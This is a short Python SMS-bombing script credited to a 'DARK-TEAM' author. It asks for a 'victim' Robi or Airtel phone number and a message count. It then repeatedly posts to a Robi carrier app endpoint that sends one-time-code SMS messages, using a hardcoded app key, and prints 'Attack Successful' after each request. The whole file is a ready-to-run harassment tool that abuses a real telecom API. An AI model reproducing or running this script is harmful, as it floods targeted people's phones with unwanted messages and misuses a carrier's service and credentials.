import requests

# POST
print ("\033[0;36m")

print("""    
             🇩​ 🇦​ 🇷​ 🇰​ - 🇹​ 🇪​ 🇦​ 🇲​         """)
print ("\033[0;36m")
print("""
      Author:       ‣  Aϝɾαɳ Aԋɱҽԃ°     """)






print ("\033[0;31m")
number = str(input(" 🔵 Enter victime robi/airtel  number: "))
print("\n")
amount= int(input(" 🔵 Target  sms boombing  amount      :  "))
api="https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&pin=13002&app_version=78&msisdn=88"+number
headers={'x-app-key': '000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg'}


print ("\033[0;34m")
for i in range(amount):
  requests.post(api,headers=headers)
  print(str(i+1)+ "  Attack Successful  ✓✓   ツ      ")